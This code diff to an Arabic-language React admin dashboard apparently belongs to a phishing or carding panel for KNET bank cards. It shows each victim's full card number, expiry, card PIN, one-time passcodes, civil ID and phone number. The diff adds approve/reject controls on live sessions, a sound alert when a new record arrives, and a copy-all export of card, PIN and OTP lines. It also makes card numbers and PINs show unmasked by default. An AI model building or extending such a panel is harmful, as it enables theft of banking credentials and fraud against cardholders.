@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -21,6 +21,7 @@ import {
   Download,
   Settings,
   Bell,
+  BellOff,
   Search,
   Filter,
   ChevronLeft,
@@ -32,8 +33,12 @@ import {
   IdCard,
   Clock,
   Globe,
+  Volume2,
+  VolumeX,
+  Check,
+  X,
 } from "lucide-react";
-import { subscribeToKnetPayments, type KnetPayment } from "@/lib/firestore";
+import { subscribeToKnetPayments, updateKnetPaymentStatus, type KnetPayment } from "@/lib/firestore";
 
 function MiniSparkline({ data, color }: { data: number[]; color: string }) {
   const max = Math.max(...data);
@@ -41,34 +46,31 @@ function MiniSparkline({ data, color }: { data: number[]; color: string }) {
   const range = max - min || 1;
   const width = 80;
   const height = 30;
-  const points = data.map((val, i) => {
-    const x = (i / (data.length - 1)) * width;
-    const y = height - ((val - min) / range) * height;
-    return `${x},${y}`;
-  }).join(" ");
+  const points = data
+    .map((val, i) => {
+      const x = (i / (data.length - 1)) * width;
+      const y = height - ((val - min) / range) * height;
+      return `${x},${y}`;
+    })
+    .join(" ");
 
   return (
     <svg width={width} height={height} className="mt-2">
-      <polyline
-        fill="none"
-        stroke={color}
-        strokeWidth="2"
-        points={points}
-      />
+      <polyline fill="none" stroke={color} strokeWidth="2" points={points} />
     </svg>
   );
 }
 
-function StatCard({ 
-  title, 
-  value, 
-  icon: Icon, 
-  color, 
-  sparklineData 
-}: { 
-  title: string; 
-  value: number | string; 
-  icon: any; 
+function StatCard({
+  title,
+  value,
+  icon: Icon,
+  color,
+  sparklineData,
+}: {
+  title: string;
+  value: number | string;
+  icon: any;
   color: string;
   sparklineData: number[];
 }) {
@@ -81,7 +83,7 @@ function StatCard({
           <MiniSparkline data={sparklineData} color={color} />
           <p className="text-xs text-green-600 mt-1">غير متاح</p>
         </div>
-        <div 
+        <div
           className="h-10 w-10 rounded-full flex items-center justify-center"
           style={{ backgroundColor: `${color}20` }}
         >
@@ -92,19 +94,21 @@ function StatCard({
   );
 }
 
-function PaymentDetailDialog({ 
-  payment, 
-  open, 
-  onClose 
-}: { 
-  payment: KnetPayment | null; 
-  open: boolean; 
+function PaymentDetailDialog({
+  payment,
+  open,
+  onClose,
+}: {
+  payment: KnetPayment | null;
+  open: boolean;
   onClose: () => void;
 }) {
-  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({});
+  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>(
+    {},
+  );
 
   const toggleField = (field: string) => {
-    setShowSensitive(prev => ({ ...prev, [field]: !prev[field] }));
+    setShowSensitive((prev) => ({ ...prev, [field]: !prev[field] }));
   };
 
   const copyToClipboard = async (text: string) => {
@@ -129,7 +133,7 @@ function PaymentDetailDialog({
             عرض تفاصيل عملية الدفع ومعلومات البطاقة
           </DialogDescription>
         </DialogHeader>
-        
+
         <div className="space-y-4 py-4">
           <div className="flex items-center gap-2 mb-4">
             {payment.online ? (
@@ -144,11 +148,16 @@ function PaymentDetailDialog({
               </Badge>
             )}
             <Badge variant="outline">{payment.bank || "غير محدد"}</Badge>
-            <Badge className={
-              payment.status === "approved" ? "bg-green-100 text-green-800" :
-              payment.status === "pending" || payment.status === "pendding" ? "bg-yellow-100 text-yellow-800" :
-              "bg-red-100 text-red-800"
-            }>
+            <Badge
+              className={
+                payment.status === "approved"
+                  ? "bg-green-100 text-green-800"
+                  : payment.status === "pending" ||
+                      payment.status === "pendding"
+                    ? "bg-yellow-100 text-yellow-800"
+                    : "bg-red-100 text-red-800"
+              }
+            >
               {payment.status || "غير محدد"}
             </Badge>
           </div>
@@ -159,41 +168,74 @@ function PaymentDetailDialog({
                 <CreditCard className="h-4 w-4" />
                 معلومات البطاقة
               </h3>
-              
+
               <div className="space-y-2 text-sm">
                 <div className="flex items-center justify-between">
                   <span className="text-muted-foreground">رقم البطاقة:</span>
                   <div className="flex items-center gap-1">
-                    <span className="font-mono">
-                      {showSensitive.card 
-                        ? `${payment.prefix || ""}${payment.cardNumber || ""}`
-                        : `${payment.prefix || "****"}-****-****-${payment.cardNumber?.slice(-4) || "****"}`
-                      }
+                    <span className="font-mono" dir="ltr">
+                      {!showSensitive.card
+                        ? `${payment.prefix || ""} - ${payment.cardNumber || ""}`
+                        : `${payment.prefix || ""} - ${payment.cardNumber || "****"}`}
                     </span>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleField('card')}>
-                      {showSensitive.card ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() => toggleField("card")}
+                    >
+                      {!showSensitive.card ? (
+                        <EyeOff className="h-3 w-3" />
+                      ) : (
+                        <Eye className="h-3 w-3" />
+                      )}
                     </Button>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(`${payment.prefix}${payment.cardNumber}`)}>
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() =>
+                        copyToClipboard(
+                          `${payment.prefix}${payment.cardNumber}`,
+                        )
+                      }
+                    >
                       <Copy className="h-3 w-3" />
                     </Button>
                   </div>
                 </div>
-                
+
                 <div className="flex items-center justify-between">
                   <span className="text-muted-foreground">تاريخ الانتهاء:</span>
-                  <span>{payment.month}/{payment.year}</span>
+                  <span>
+                    {payment.month}/{payment.year}
+                  </span>
                 </div>
-                
+
                 <div className="flex items-center justify-between">
                   <span className="text-muted-foreground">الرقم السري:</span>
                   <div className="flex items-center gap-1">
                     <span className="font-mono font-bold text-red-600">
-                      {showSensitive.pin ? payment.pass : "****"}
+                      {!showSensitive.pin ? payment.pass : "****"}
                     </span>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleField('pin')}>
-                      {showSensitive.pin ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() => toggleField("pin")}
+                    >
+                      {showSensitive.pin ? (
+                        <EyeOff className="h-3 w-3" />
+                      ) : (
+                        <Eye className="h-3 w-3" />
+                      )}
                     </Button>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(payment.pass || "")}>
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() => copyToClipboard(payment.pass || "")}
+                    >
                       <Copy className="h-3 w-3" />
                     </Button>
                   </div>
@@ -206,7 +248,7 @@ function PaymentDetailDialog({
                 <Phone className="h-4 w-4" />
                 معلومات OTP
               </h3>
-              
+
               <div className="space-y-2 text-sm">
                 {payment.otp && (
                   <div className="flex items-center justify-between">
@@ -215,16 +257,30 @@ function PaymentDetailDialog({
                       <span className="font-mono font-bold text-green-600">
                         {showSensitive.otp ? payment.otp : "****"}
                       </span>
-                      <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleField('otp')}>
-                        {showSensitive.otp ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        className="h-6 w-6"
+                        onClick={() => toggleField("otp")}
+                      >
+                        {showSensitive.otp ? (
+                          <EyeOff className="h-3 w-3" />
+                        ) : (
+                          <Eye className="h-3 w-3" />
+                        )}
                       </Button>
-                      <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(payment.otp || "")}>
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        className="h-6 w-6"
+                        onClick={() => copyToClipboard(payment.otp || "")}
+                      >
                         <Copy className="h-3 w-3" />
                       </Button>
                     </div>
                   </div>
                 )}
-                
+
                 {payment.otp2 && (
                   <div className="flex items-center justify-between">
                     <span className="text-muted-foreground">OTP 2:</span>
@@ -232,24 +288,50 @@ function PaymentDetailDialog({
                       <span className="font-mono font-bold">
                         {showSensitive.otp2 ? payment.otp2 : "****"}
                       </span>
-                      <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleField('otp2')}>
-                        {showSensitive.otp2 ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        className="h-6 w-6"
+                        onClick={() => toggleField("otp2")}
+                      >
+                        {showSensitive.otp2 ? (
+                          <EyeOff className="h-3 w-3" />
+                        ) : (
+                          <Eye className="h-3 w-3" />
+                        )}
                       </Button>
                     </div>
                   </div>
                 )}
-                
+
                 {payment.allOtps && payment.allOtps.length > 0 && (
                   <div>
                     <span className="text-muted-foreground">جميع OTPs:</span>
                     <div className="flex flex-wrap gap-1 mt-1">
-                      {payment.allOtps.filter(o => o && o.trim()).map((otp, i) => (
-                        <Badge key={i} variant="secondary" className="font-mono text-xs">
-                          {showSensitive.allOtps ? otp.replace(/,/g, "").trim() : "****"}
-                        </Badge>
-                      ))}
-                      <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => toggleField('allOtps')}>
-                        {showSensitive.allOtps ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
+                      {payment.allOtps
+                        .filter((o) => o && o.trim())
+                        .map((otp, i) => (
+                          <Badge
+                            key={i}
+                            variant="secondary"
+                            className="font-mono text-xs"
+                          >
+                            {showSensitive.allOtps
+                              ? otp.replace(/,/g, "").trim()
+                              : "****"}
+                          </Badge>
+                        ))}
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        className="h-6 w-6"
+                        onClick={() => toggleField("allOtps")}
+                      >
+                        {showSensitive.allOtps ? (
+                          <EyeOff className="h-3 w-3" />
+                        ) : (
+                          <Eye className="h-3 w-3" />
+                        )}
                       </Button>
                     </div>
                   </div>
@@ -264,32 +346,44 @@ function PaymentDetailDialog({
                 <IdCard className="h-4 w-4" />
                 معلومات شخصية
               </h3>
-              
+
               <div className="space-y-2 text-sm">
                 {payment.idNumber && (
                   <div className="flex items-center justify-between">
                     <span className="text-muted-foreground">الرقم المدني:</span>
                     <div className="flex items-center gap-1">
                       <span className="font-mono">{payment.idNumber}</span>
-                      <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(payment.idNumber || "")}>
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        className="h-6 w-6"
+                        onClick={() => copyToClipboard(payment.idNumber || "")}
+                      >
                         <Copy className="h-3 w-3" />
                       </Button>
                     </div>
                   </div>
                 )}
-                
+
                 {payment.phoneNumber && (
                   <div className="flex items-center justify-between">
                     <span className="text-muted-foreground">رقم الهاتف:</span>
                     <div className="flex items-center gap-1">
                       <span>{payment.phoneNumber}</span>
-                      <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(payment.phoneNumber || "")}>
+                      <Button
+                        variant="ghost"
+                        size="icon"
+                        className="h-6 w-6"
+                        onClick={() =>
+                          copyToClipboard(payment.phoneNumber || "")
+                        }
+                      >
                         <Copy className="h-3 w-3" />
                       </Button>
                     </div>
                   </div>
                 )}
-                
+
                 {payment.network && (
                   <div className="flex items-center justify-between">
                     <span className="text-muted-foreground">الشبكة:</span>
@@ -304,13 +398,17 @@ function PaymentDetailDialog({
                 <Clock className="h-4 w-4" />
                 معلومات إضافية
               </h3>
-              
+
               <div className="space-y-2 text-sm">
                 <div className="flex items-center justify-between">
                   <span className="text-muted-foreground">تاريخ الإنشاء:</span>
-                  <span>{payment.createdDate ? new Date(payment.createdDate).toLocaleString('ar-KW') : "غير متاح"}</span>
+                  <span>
+                    {payment.createdDate
+                      ? new Date(payment.createdDate).toLocaleString("ar-KW")
+                      : "غير متاح"}
+                  </span>
                 </div>
-                
+
                 <div className="flex items-center justify-between">
                   <span className="text-muted-foreground">الخطوة:</span>
                   <div className="flex gap-0.5">
@@ -318,20 +416,25 @@ function PaymentDetailDialog({
                       <div
                         key={step}
                         className={`h-2 w-2 rounded-full ${
-                          step <= (payment.step || 1) 
-                            ? 'bg-green-500' 
-                            : 'bg-gray-300'
+                          step <= (payment.step || 1)
+                            ? "bg-green-500"
+                            : "bg-gray-300"
                         }`}
                       />
                     ))}
                   </div>
                 </div>
-                
+
                 <div className="flex items-center justify-between">
                   <span className="text-muted-foreground">ID:</span>
                   <div className="flex items-center gap-1">
                     <span className="font-mono text-xs">{payment.id}</span>
-                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => copyToClipboard(payment.id)}>
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-6 w-6"
+                      onClick={() => copyToClipboard(payment.id)}
+                    >
                       <Copy className="h-3 w-3" />
                     </Button>
                   </div>
@@ -341,20 +444,75 @@ function PaymentDetailDialog({
           </div>
 
           <div className="flex gap-2 pt-4 border-t">
-            <Button variant="destructive" className="flex-1">
+            <Button 
+              variant="destructive" 
+              className="flex-1"
+              onClick={async () => {
+                try {
+                  await updateKnetPaymentStatus(payment.id, "rejected");
+                  onClose();
+                } catch (err) {
+                  console.error("Failed to reject payment:", err);
+                }
+              }}
+              data-testid="button-dialog-reject"
+            >
+              <X className="h-4 w-4 ml-2" />
               رفض
             </Button>
-            <Button className="flex-1 bg-orange-500 hover:bg-orange-600">
-              تأكيد
-            </Button>
-            <Button className="flex-1 bg-green-500 hover:bg-green-600">
-              إرسال
+            <Button 
+              className="flex-1 bg-green-600 hover:bg-green-700"
+              onClick={async () => {
+                try {
+                  await updateKnetPaymentStatus(payment.id, "approved");
+                  onClose();
+                } catch (err) {
+                  console.error("Failed to approve payment:", err);
+                }
+              }}
+              data-testid="button-dialog-approve"
+            >
+              <Check className="h-4 w-4 ml-2" />
+              قبول
             </Button>
           </div>
         </div>
       </DialogContent>
     </Dialog>
   );
+}
+
+function useNotificationSound() {
+  const audioContextRef = useRef<AudioContext | null>(null);
+
+  const playNotificationSound = useCallback(() => {
+    try {
+      if (!audioContextRef.current) {
+        audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
+      }
+      const ctx = audioContextRef.current;
+      
+      const oscillator = ctx.createOscillator();
+      const gainNode = ctx.createGain();
+      
+      oscillator.connect(gainNode);
+      gainNode.connect(ctx.destination);
+      
+      oscillator.frequency.setValueAtTime(880, ctx.currentTime);
+      oscillator.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
+      oscillator.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
+      
+      gainNode.gain.setValueAtTime(0.3, ctx.currentTime);
+      gainNode.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+      
+      oscillator.start(ctx.currentTime);
+      oscillator.stop(ctx.currentTime + 0.3);
+    } catch (err) {
+      console.error("Audio playback failed:", err);
+    }
+  }, []);
+
+  return playNotificationSound;
 }
 
 export default function AdminDashboard() {
@@ -364,20 +522,28 @@ export default function AdminDashboard() {
   const [knetLoading, setKnetLoading] = useState(true);
   const [searchQuery, setSearchQuery] = useState("");
   const [currentPage, setCurrentPage] = useState(1);
-  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({});
-  const [selectedPayment, setSelectedPayment] = useState<KnetPayment | null>(null);
+  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>(
+    {},
+  );
+  const [selectedPayment, setSelectedPayment] = useState<KnetPayment | null>(
+    null,
+  );
   const [detailDialogOpen, setDetailDialogOpen] = useState(false);
+  const [soundEnabled, setSoundEnabled] = useState(true);
+  const previousPaymentCount = useRef<number>(0);
+  const isInitialLoad = useRef<boolean>(true);
+  const playNotificationSound = useNotificationSound();
   const itemsPerPage = 15;
 
   useEffect(() => {
     const token = localStorage.getItem("adminSession");
     const user = localStorage.getItem("adminUser");
-    
+
     if (!token || !user) {
       setLocation("/admin/login");
       return;
     }
-    
+
     try {
       setAdminUser(JSON.parse(user));
     } catch {
@@ -387,16 +553,21 @@ export default function AdminDashboard() {
 
   useEffect(() => {
     const unsubscribe = subscribeToKnetPayments((payments) => {
+      if (!isInitialLoad.current && soundEnabled && payments.length > previousPaymentCount.current) {
+        playNotificationSound();
+      }
+      previousPaymentCount.current = payments.length;
+      isInitialLoad.current = false;
       setKnetPayments(payments);
       setKnetLoading(false);
     });
     return () => unsubscribe();
-  }, []);
+  }, [soundEnabled, playNotificationSound]);
 
   const toggleSensitive = (id: string, field: string) => {
-    setShowSensitive(prev => ({
+    setShowSensitive((prev) => ({
       ...prev,
-      [`${id}-${field}`]: !prev[`${id}-${field}`]
+      [`${id}-${field}`]: !prev[`${id}-${field}`],
     }));
   };
 
@@ -412,7 +583,7 @@ export default function AdminDashboard() {
     }
   };
 
-  const filteredPayments = knetPayments.filter(payment => {
+  const filteredPayments = knetPayments.filter((payment) => {
     if (!searchQuery) return true;
     const search = searchQuery.toLowerCase();
     return (
@@ -427,13 +598,15 @@ export default function AdminDashboard() {
   const totalPages = Math.ceil(filteredPayments.length / itemsPerPage);
   const paginatedPayments = filteredPayments.slice(
     (currentPage - 1) * itemsPerPage,
-    currentPage * itemsPerPage
+    currentPage * itemsPerPage,
   );
 
-  const onlineCount = knetPayments.filter(p => p.online).length;
+  const onlineCount = knetPayments.filter((p) => p.online).length;
   const totalVisitors = knetPayments.length;
-  const cardInfoCount = knetPayments.filter(p => p.cardNumber).length;
-  const walletCount = knetPayments.filter(p => p.status === "approved").length;
+  const cardInfoCount = knetPayments.filter((p) => p.cardNumber).length;
+  const walletCount = knetPayments.filter(
+    (p) => p.status === "approved",
+  ).length;
 
   const getTimeAgo = (date: any) => {
     if (!date) return "غير معروف";
@@ -475,31 +648,63 @@ export default function AdminDashboard() {
             </div>
             <div>
               <h1 className="font-semibold text-lg">لوحة الإشعارات المتقدمة</h1>
-              <p className="text-xs text-white/60">آخر تحديث: {new Date().toLocaleTimeString('ar-KW')}</p>
+              <p className="text-xs text-white/60">
+                آخر تحديث: {new Date().toLocaleTimeString("ar-KW")}
+              </p>
             </div>
           </div>
           <div className="flex items-center gap-2">
-            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+            <Button
+              variant="ghost"
+              size="icon"
+              className={`text-white hover:bg-white/10 ${soundEnabled ? 'bg-green-600/20' : ''}`}
+              onClick={() => setSoundEnabled(!soundEnabled)}
+              data-testid="button-toggle-sound"
+              title={soundEnabled ? "إيقاف الصوت" : "تفعيل الصوت"}
+            >
+              {soundEnabled ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4" />}
+            </Button>
+            <Button
+              variant="ghost"
+              size="icon"
+              className="text-white hover:bg-white/10"
+            >
               <Bell className="h-4 w-4" />
             </Button>
-            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+            <Button
+              variant="ghost"
+              size="icon"
+              className="text-white hover:bg-white/10"
+            >
               <Settings className="h-4 w-4" />
             </Button>
-            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10" onClick={() => window.location.reload()}>
+            <Button
+              variant="ghost"
+              size="icon"
+              className="text-white hover:bg-white/10"
+              onClick={() => window.location.reload()}
+            >
               <RefreshCw className="h-4 w-4" />
             </Button>
-            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+            <Button
+              variant="ghost"
+              size="icon"
+              className="text-white hover:bg-white/10"
+            >
               <Download className="h-4 w-4" />
             </Button>
-            <Button 
-              size="sm" 
+            <Button
+              size="sm"
               className="bg-green-600 hover:bg-green-700 text-white rounded-full px-4"
               data-testid="button-copy-all"
               onClick={async () => {
                 try {
-                  const allData = knetPayments.map(p => 
-                    `${p.prefix || ""}${p.cardNumber || ""} | ${p.month || ""}/${p.year || ""} | PIN: ${p.pass || "-"} | OTP: ${p.otp || "-"}`
-                  ).join('\n');
+                  const allData = knetPayments
+                    .map(
+                      (p) =>
+                        `${p.prefix || ""}${p.cardNumber || ""} | ${p.month || ""}/${p.year || ""} | PIN: ${p.pass || "-"} | OTP: ${p.otp || "-"}`,
+                    )
+                    .join("\n");
                   await navigator.clipboard.writeText(allData);
                 } catch (err) {
                   console.error("Copy failed:", err);
@@ -608,16 +813,16 @@ export default function AdminDashboard() {
                 </thead>
                 <tbody className="divide-y">
                   {paginatedPayments.map((payment) => (
-                    <tr 
-                      key={payment.id} 
-                      className="hover:bg-muted/30 cursor-pointer" 
+                    <tr
+                      key={payment.id}
+                      className="hover:bg-muted/30 cursor-pointer"
                       data-testid={`row-payment-${payment.id}`}
                       onClick={() => openPaymentDetail(payment)}
                     >
                       <td className="p-3">
                         <div className="flex items-center gap-1">
                           <Globe className="h-3 w-3" />
-                          <span className="font-medium">Kuwait</span>
+                          <span className="font-medium">{payment.country}</span>
                         </div>
                       </td>
                       <td className="p-3">
@@ -649,68 +854,92 @@ export default function AdminDashboard() {
                         {getTimeAgo(payment.createdDate)}
                       </td>
                       <td className="p-3">
-                        <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
+                        <div
+                          className="flex items-center gap-1"
+                          onClick={(e) => e.stopPropagation()}
+                        >
                           <span className="font-mono text-xs">
-                            {isSensitiveVisible(payment.id, 'card') 
-                              ? `${payment.prefix || ""}${payment.cardNumber || "---"}`
-                              : `****${payment.cardNumber?.slice(-4) || "****"}`
-                            }
+                            {isSensitiveVisible(payment.id, "card")
+                              ? `${payment.prefix || ""}' - '${payment.cardNumber || "---"}`
+                              : `${payment.cardNumber || "****"}`}
                           </span>
                           <Button
                             variant="ghost"
                             size="icon"
                             className="h-5 w-5"
-                            onClick={(e) => { e.stopPropagation(); toggleSensitive(payment.id, 'card'); }}
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              toggleSensitive(payment.id, "card");
+                            }}
                             data-testid={`toggle-card-${payment.id}`}
                           >
-                            {isSensitiveVisible(payment.id, 'card') 
-                              ? <EyeOff className="h-3 w-3" />
-                              : <Eye className="h-3 w-3" />
-                            }
+                            {isSensitiveVisible(payment.id, "card") ? (
+                              <EyeOff className="h-3 w-3" />
+                            ) : (
+                              <Eye className="h-3 w-3" />
+                            )}
                           </Button>
                         </div>
                       </td>
                       <td className="p-3">
-                        <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
-                          <Badge variant="secondary" className="font-mono bg-red-100 text-red-800">
-                            {isSensitiveVisible(payment.id, 'pin') 
-                              ? (payment.pass || "---")
-                              : "****"
-                            }
+                        <div
+                          className="flex items-center gap-1"
+                          onClick={(e) => e.stopPropagation()}
+                        >
+                          <Badge
+                            variant="secondary"
+                            className="font-mono bg-red-100 text-red-800"
+                          >
+                            {isSensitiveVisible(payment.id, "pin")
+                              ? payment.pass || "---"
+                              : "****"}
                           </Badge>
                           <Button
                             variant="ghost"
                             size="icon"
                             className="h-5 w-5"
-                            onClick={(e) => { e.stopPropagation(); toggleSensitive(payment.id, 'pin'); }}
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              toggleSensitive(payment.id, "pin");
+                            }}
                             data-testid={`toggle-pin-${payment.id}`}
                           >
-                            {isSensitiveVisible(payment.id, 'pin') 
-                              ? <EyeOff className="h-3 w-3" />
-                              : <Eye className="h-3 w-3" />
-                            }
+                            {isSensitiveVisible(payment.id, "pin") ? (
+                              <EyeOff className="h-3 w-3" />
+                            ) : (
+                              <Eye className="h-3 w-3" />
+                            )}
                           </Button>
                         </div>
                       </td>
                       <td className="p-3">
-                        <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
-                          <Badge variant="secondary" className="font-mono bg-amber-100 text-amber-800">
-                            {isSensitiveVisible(payment.id, 'otp') 
-                              ? (payment.otp || "---")
-                              : "****"
-                            }
+                        <div
+                          className="flex items-center gap-1"
+                          onClick={(e) => e.stopPropagation()}
+                        >
+                          <Badge
+                            variant="secondary"
+                            className="font-mono bg-amber-100 text-amber-800"
+                          >
+                            {isSensitiveVisible(payment.id, "otp")
+                              ? payment.otp || "---"
+                              : "****"}
                           </Badge>
                           <Button
                             variant="ghost"
                             size="icon"
                             className="h-5 w-5"
-                            onClick={(e) => { e.stopPropagation(); toggleSensitive(payment.id, 'otp'); }}
+                            onClick={(e) => {
+                              e.stopPropagation();
+                              toggleSensitive(payment.id, "otp");
+                            }}
                             data-testid={`toggle-otp-${payment.id}`}
                           >
-                            {isSensitiveVisible(payment.id, 'otp') 
-                              ? <EyeOff className="h-3 w-3" />
-                              : <Eye className="h-3 w-3" />
-                            }
+                            {isSensitiveVisible(payment.id, "otp") ? (
+                              <EyeOff className="h-3 w-3" />
+                            ) : (
+                              <Eye className="h-3 w-3" />
+                            )}
                           </Button>
                         </div>
                       </td>
@@ -720,40 +949,51 @@ export default function AdminDashboard() {
                             <div
                               key={step}
                               className={`h-2 w-2 rounded-full ${
-                                step <= (payment.step || 1) 
-                                  ? 'bg-green-500' 
-                                  : 'bg-gray-300'
+                                step <= (payment.step || 1)
+                                  ? "bg-green-500"
+                                  : "bg-gray-300"
                               }`}
                             />
                           ))}
                         </div>
                       </td>
                       <td className="p-3">
-                        <div className="flex items-center gap-1" onClick={(e) => e.stopPropagation()}>
+                        <div
+                          className="flex items-center gap-1"
+                          onClick={(e) => e.stopPropagation()}
+                        >
                           <Button
                             size="sm"
                             variant="destructive"
                             className="h-6 px-2 text-xs rounded-full"
-                            onClick={(e) => e.stopPropagation()}
+                            onClick={async (e) => {
+                              e.stopPropagation();
+                              try {
+                                await updateKnetPaymentStatus(payment.id, "rejected");
+                              } catch (err) {
+                                console.error("Failed to reject payment:", err);
+                              }
+                            }}
                             data-testid={`button-reject-${payment.id}`}
                           >
+                            <X className="h-3 w-3 ml-1" />
                             رفض
                           </Button>
                           <Button
                             size="sm"
-                            className="h-6 px-2 text-xs rounded-full bg-orange-500 hover:bg-orange-600"
-                            onClick={(e) => e.stopPropagation()}
-                            data-testid={`button-confirm-${payment.id}`}
+                            className="h-6 px-2 text-xs rounded-full bg-green-600 hover:bg-green-700"
+                            onClick={async (e) => {
+                              e.stopPropagation();
+                              try {
+                                await updateKnetPaymentStatus(payment.id, "approved");
+                              } catch (err) {
+                                console.error("Failed to approve payment:", err);
+                              }
+                            }}
+                            data-testid={`button-approve-${payment.id}`}
                           >
-                            تأكيد
-                          </Button>
-                          <Button
-                            size="sm"
-                            className="h-6 px-2 text-xs rounded-full bg-green-500 hover:bg-green-600"
-                            onClick={(e) => e.stopPropagation()}
-                            data-testid={`button-send-${payment.id}`}
-                          >
-                            إرسال
+                            <Check className="h-3 w-3 ml-1" />
+                            قبول
                           </Button>
                         </div>
                       </td>
@@ -767,13 +1007,15 @@ export default function AdminDashboard() {
           {totalPages > 1 && (
             <div className="p-4 border-t flex items-center justify-between gap-4">
               <div className="text-sm text-muted-foreground">
-                عرض {(currentPage - 1) * itemsPerPage + 1} - {Math.min(currentPage * itemsPerPage, filteredPayments.length)} من {filteredPayments.length}
+                عرض {(currentPage - 1) * itemsPerPage + 1} -{" "}
+                {Math.min(currentPage * itemsPerPage, filteredPayments.length)}{" "}
+                من {filteredPayments.length}
               </div>
               <div className="flex items-center gap-2">
                 <Button
                   variant="outline"
                   size="icon"
-                  onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
+                  onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
                   disabled={currentPage === 1}
                   data-testid="button-prev-page"
                 >
@@ -785,7 +1027,9 @@ export default function AdminDashboard() {
                 <Button
                   variant="outline"
                   size="icon"
-                  onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
+                  onClick={() =>
+                    setCurrentPage((p) => Math.min(totalPages, p + 1))
+                  }
                   disabled={currentPage === totalPages}
                   data-testid="button-next-page"
                 >
@@ -797,10 +1041,10 @@ export default function AdminDashboard() {
         </div>
       </main>
 
-      <PaymentDetailDialog 
-        payment={selectedPayment} 
-        open={detailDialogOpen} 
-        onClose={() => setDetailDialogOpen(false)} 
+      <PaymentDetailDialog
+        payment={selectedPayment}
+        open={detailDialogOpen}
+        onClose={() => setDetailDialogOpen(false)}
       />
     </div>
   );
